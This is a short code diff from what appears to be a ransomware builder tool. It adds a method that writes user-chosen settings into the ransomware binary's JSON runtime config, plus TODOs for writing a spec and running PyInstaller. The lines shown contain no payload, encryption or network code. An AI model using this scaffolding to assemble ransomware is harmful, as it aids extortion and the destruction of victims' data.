@@ -166,6 +166,14 @@ class BuilderThread(Thread):
         if not self.__build_error and not self.__build_stopped:
             self.__console_log(msg="Validation successful", debug_level=1)
             
+        # Write runtime config and spec
+        self.__create_runtime_config()
+        # TODO Perhaps spec should be a separate object.... Actually map this one out with methods
+        # Have an add data/resource method, set encryption, write spec, set icon etc. etc.
+        
+        # TODO Invoke Pyinstaller via subprocess
+        
+            
         # If not error, set success
         if not self.__build_error and not self.__build_stopped:
             self.__build_success = True
@@ -176,6 +184,25 @@ class BuilderThread(Thread):
         self.__build_error = False
         self.__build_stopped = False
         self.__build_success = False
+        
+    
+    def __create_runtime_config(self):
+        '''
+        @summary: Creates and writes ransomware's runtime config file
+        '''
+        self.__console_log(msg="Creating binary runtime config at %s" % RUNTIME_CONFIG_PATH,
+                           debug_level=1)
+        config_dict = {}
+        
+        for config_item in RUNTIME_CONFIG_ITEMS:
+            config_dict[config_item] = self.user_input_dict[config_item]
+        self.__console_log(msg="Runtime config: %s" % config_dict, debug_level=3)
+            
+        with open(RUNTIME_CONFIG_PATH, "w") as runtime_config_file:
+            json.dump(config_dict, runtime_config_file)
+            
+        self.__console_log(msg="Runtime config successfully written", debug_level=1)
+
         
     
     def finished_with_error(self):
